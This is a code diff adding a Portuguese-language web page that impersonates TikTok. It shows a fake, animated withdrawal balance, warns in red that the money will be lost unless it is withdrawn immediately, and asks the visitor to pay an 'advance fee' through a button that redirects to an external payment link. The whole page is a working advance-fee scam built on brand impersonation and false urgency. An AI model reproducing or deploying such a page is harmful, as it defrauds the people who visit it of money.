@@ -1,0 +1,139 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
+    <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/slider.css">
+    <link rel="stylesheet" href="css/animated.css">
+    <link rel="shortcut icon" href="images/faveicon.png">
+    <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+    <title> TikTok Adiantamento </title>
+
+    <style>
+        /* Estilo da barra de progresso */
+        .progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            overflow: hidden;
+            margin-bottom: 10px;
+            margin-top: -10px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 30px;
+            background-color: #FFDF00;
+            text-align: center;
+            line-height: 30px;
+            color: black;
+            transition: width 1s ease-in-out;
+        }
+
+        /* Estilo do botão */
+        button {
+            margin-bottom: 15px;
+            background-color: red;;
+            color: white;
+            border-radius: 10px;
+            width: 95%;
+            height: 60px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body class="fundoWhite">
+    <div class="corteLayoutTop"></div>
+    
+
+    <div id="p1" style="background-color: black; padding: 15px 0 18px 0;">
+        <img style="width: 40%; margin: auto; margin-left: 5px; position: relative; margin-top: 3px;" src="images/tik.png">
+        <div class="boxSaldo">
+            <label for="input" class="textoSaldo" style="background-color: black;">SALDO</label>
+            <p class="valorSaldo">R$ <span class="saldoAtualizado">587.18</span></p>
+        </div>
+    </div><br>
+    <div style="font-size: 11px; color: red; text-align: center; border: 1px solid red; padding: 10px; background-color: #f8d7da; border-radius: 10px 10px 10px 10px;">
+    <b>ATENÇÃO:</b><br> CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
+</div>
+
+    <div id="produto1" style="width: 100%;">
+        <div style="text-align: center; display: flex; padding: 10px; justify-content: center; align-items: center; flex-direction: column; align-content: center; flex-wrap: wrap; position: relative;">
+            <img style="width: 130px; margin-bottom: -20px;" src="images/artpoin-logo-pix1.png">
+
+            <p style="font-size: 16px; color: white;"><b>SAQUE SOLICITADO COM SUCESSO!</b><br>
+    </p><p style="font-size: 14px; color: white;">CHAVE PIX VERIFICADA ✅ <br>Seu saque será enviado dentro de <b>28 dias úteis</b> para a <u>Chave Pix Cadastrada.</u><br><br>
+    
+    Os valores de <b>19,90</b> e <b>29,90</b> estão sendo processados o devido <b>REEMBOLSO,</b> para ser enviado juntamente do seu saque total.<br><br> Caso deseje <strong>Adiantar</strong> seu saque e receber os valores das taxas <b>imediatamente,</b> pague a <b>Taxa de Adiantamento</b> e veja seu saque cair em até 2 minutos. <br><b></b>
+</p><p></p>
+
+<button id="paymentButton">PAGAR TAXA DE ADIANTAMENTO<br> E RECEBER AGORA!</button>
+
+<p style="font-size: 12px; color: white; margin-top: 30px;">
+    TikTok, 2024<br>
+    Todos os direitos reservados.
+</p>
+
+        </div>
+    </div>
+
+    <script src="js/notiflix-3.2.5.min.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const saldoElemento = document.querySelector('.saldoAtualizado');
+            const saldoFinal = 609.31;
+            const saldoInicial = 579.41;
+            const duracao = 2000; // Duração total em milissegundos (3 segundos)
+            const passos = 100; // Número de passos na animação
+            const incremento = (saldoFinal - saldoInicial) / passos;
+            const tempo = duracao / passos;
+    
+            let saldoAtual = saldoInicial;
+    
+            function atualizarSaldo() {
+                saldoAtual += incremento;
+                saldoElemento.textContent = saldoAtual.toFixed(2);
+                
+                if (saldoAtual < saldoFinal) {
+                    setTimeout(atualizarSaldo, tempo);
+                } else {
+                    saldoElemento.textContent = saldoFinal.toFixed(2);
+                }
+            }
+    
+            atualizarSaldo();
+        });
+    </script>
+    
+    <script type="text/javascript">
+        // Função para atualizar a barra de progresso
+        function updateProgressBar() {
+            const progressBar = document.getElementById('myProgressBar');
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 95) {
+                    clearInterval(interval);
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    progressBar.textContent = width + '%';
+                }
+            }, 10); // Tempo de atualização em milissegundos (ajuste se necessário)
+        }
+
+        // Chama a função quando a página carregar
+        window.onload = updateProgressBar;
+
+        document.getElementById('paymentButton').addEventListener('click', function() {
+            window.location.href = 'https://pay.sunize.com.br/cfWoXMdX'; // Substitua 'pagina-destino.html' pela URL para a qual deseja redirecionar
+        });
+    </script>
+
+
+
+</body></html>
